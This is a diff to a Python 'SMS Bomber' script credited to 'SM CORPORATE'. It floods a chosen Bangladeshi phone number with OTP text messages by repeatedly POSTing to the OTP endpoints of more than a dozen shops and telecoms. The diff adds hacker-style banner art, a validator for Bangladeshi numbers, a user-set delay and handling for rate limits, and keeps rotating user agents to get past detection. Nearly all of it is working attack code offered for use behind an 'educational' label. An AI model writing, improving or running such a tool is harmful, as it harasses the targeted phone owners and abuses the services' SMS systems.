@@ -6,7 +6,20 @@ import sys
 import os
 from datetime import datetime
 
-# List of APIs
+# Hacker-style ASCII art
+HACKER_ART = """
+          ____  __  _______ ____ ___  ____  ____  
+         / ___||  \/  | ____|  _ \\  _ \\ ___ \\ 
+        \\___ \\| |\\/| |  _| | | | | | | |  _  /
+         ___) | |  | | |___| |_| | |_| | | \\ \\
+        |____/|_|  |_|_____|____/ \\___/|_|  \\_\\
+        
+        === SM CORPORATE 🍁 SMS Bomber ===
+        Coded by: SM CORPORATE Team
+        For Educational Use Only!
+"""
+
+# List of APIs (all POST, Bangladeshi-focused)
 APIs = [
     {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
@@ -22,16 +35,11 @@ APIs = [
     {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Daraz Pakistan OTP", "url": "https://daraz.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Viber OTP", "url": "https://viber.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "EasyPaisa OTP", "url": "https://www.easypaisa.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Telenor OTP", "url": "https://www.telenor.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Jazz OTP", "url": "https://www.jazz.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
 ]
 
-# Random User-Agents to mimic different devices
+# Random User-Agents
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
@@ -41,17 +49,17 @@ USER_AGENTS = [
 def clear_screen():
     os.system("clear" if os.name == "posix" else "cls")
 
+def validate_phone(phone):
+    return phone.isdigit() and len(phone) == 11 and phone.startswith("01")
+
 def format_phone_number(api_name, phone):
-    if api_name in ["Daraz OTP", "Daraz Pakistan OTP", "Viber OTP"]:
-        return "+" + phone  # International format
-    elif api_name in ["Grameenphone OTP", "Robi OTP"]:
-        return phone if phone.startswith("01") else "0" + phone  # Local format
+    if api_name in ["Grameenphone OTP", "Robi OTP"]:
+        return phone if phone.startswith("01") else "0" + phone
     return phone
 
 def send_request(api, phone):
     formatted_phone = format_phone_number(api["name"], phone)
     url = api["url"]
-    method = api["method"]
     data = json.loads(json.dumps(api["data"]).replace("{number}", formatted_phone))
     headers = {
         "Content-Type": "application/json",
@@ -62,65 +70,50 @@ def send_request(api, phone):
     }
 
     try:
-        if method == "POST":
-            response = requests.post(url, json=data, headers=headers, timeout=10)
-        else:
-            response = requests.get(url, params=data, headers=headers, timeout=10)
-
+        response = requests.post(url, json=data, headers=headers, timeout=10)
         status = "Success" if response.status_code < 400 else f"Failed (Status: {response.status_code})"
         return {"success": response.status_code < 400, "status": status}
     except requests.RequestException as e:
         return {"success": False, "status": f"Error: {str(e)}"}
 
-def select_apis():
-    clear_screen()
-    print("=== SM CORPORATE 🍁 SMS Bomber ===")
-    print("Select APIs to use (enter numbers separated by commas, or 'all' for all):")
-    for i, api in enumerate(APIs):
-        print(f"{i+1}. {api['name']}")
-    choice = input("\nYour choice (e.g., 1,2,3 or all): ").strip().lower()
-
-    if choice == "all":
-        return APIs
-    try:
-        indices = [int(x) - 1 for x in choice.split(",")]
-        return [APIs[i] for i in indices if 0 <= i < len(APIs)]
-    except (ValueError, IndexError):
-        print("Invalid selection. Using all APIs.")
-        time.sleep(2)
-        return APIs
-
 def main():
     clear_screen()
-    print("=== SM CORPORATE 🍁 SMS Bomber ===")
-    phone = input("Enter phone number (e.g., 01712345678): ").strip()
-    if not phone.isdigit() or len(phone) < 10:
-        print("Invalid phone number. Exiting...")
-        time.sleep(2)
+    print(HACKER_ART)
+    
+    # Input phone number
+    phone = input("Enter Bangladeshi phone number (e.g., 01712345678): ").strip()
+    if not validate_phone(phone):
+        print("Invalid Bangladeshi number! Must be 11 digits starting with 01.")
+        input("Press Enter to exit...")
         return
 
+    # Input message count
     try:
         count = int(input("Enter number of messages (1-100): ").strip())
         if not 1 <= count <= 100:
             raise ValueError
     except ValueError:
-        print("Invalid message count. Exiting...")
-        time.sleep(2)
+        print("Invalid message count! Must be 1-100.")
+        input("Press Enter to exit...")
         return
 
-    selected_apis = select_apis()
-    if not selected_apis:
-        print("No APIs selected. Exiting...")
-        time.sleep(2)
+    # Input delay
+    try:
+        delay = float(input("Enter delay between requests (seconds, e.g., 2): ").strip())
+        if delay < 0:
+            raise ValueError
+    except ValueError:
+        print("Invalid delay! Must be a non-negative number.")
+        input("Press Enter to exit...")
         return
 
-    print(f"\nStarting SMS bombing to {phone} with {count} messages...")
-    total_requests = len(selected_apis) * count
+    print(f"\nStarting SMS bombing to {phone} with {count} messages (delay: {delay}s)...")
+    total_requests = len(APIs) * count
     current_request = 0
 
     for i in range(count):
-        random.shuffle(selected_apis)  # Randomize API order
-        for api in selected_apis:
+        random.shuffle(APIs)  # Randomize API order
+        for api in APIs:
             result = send_request(api, phone)
             current_request += 1
             progress = (current_request / total_requests) * 100
@@ -131,12 +124,12 @@ def main():
                 print("Rate limit detected. Pausing for 10 seconds...")
                 time.sleep(10)
             else:
-                time.sleep(random.uniform(2, 5))  # Random delay 2–5 seconds
+                time.sleep(delay + random.uniform(0, 1))  # User delay + random 0-1s
 
         if i < count - 1:
             time.sleep(random.uniform(5, 10))  # Delay between rounds
 
-    print("\nSMS bombing completed!")
+    print("\nSMS bombing completed successfully!")
     input("Press Enter to exit...")
 
 if __name__ == "__main__":
